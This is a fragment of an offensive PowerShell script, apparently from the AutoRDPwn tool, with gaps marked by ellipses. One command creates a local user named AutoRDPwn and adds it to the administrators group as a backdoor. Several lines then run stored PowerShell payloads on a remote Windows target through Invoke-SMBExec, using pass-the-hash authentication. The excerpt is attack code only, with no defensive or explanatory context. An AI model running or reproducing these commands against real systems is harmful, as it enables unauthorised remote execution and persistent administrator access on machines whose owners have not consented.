...
$Ps5="net user AutoRDPwn AutoRDPwn /add ; net localgroup Administradores AutoRDPwn /add"
	...
	Write-Host ""
        ...
        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Ps1" ; Write-Host ""
        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Ps2" ; Write-Host ""
        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Ps3" ; Write-Host ""
        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Ps4" ; Write-Host ""
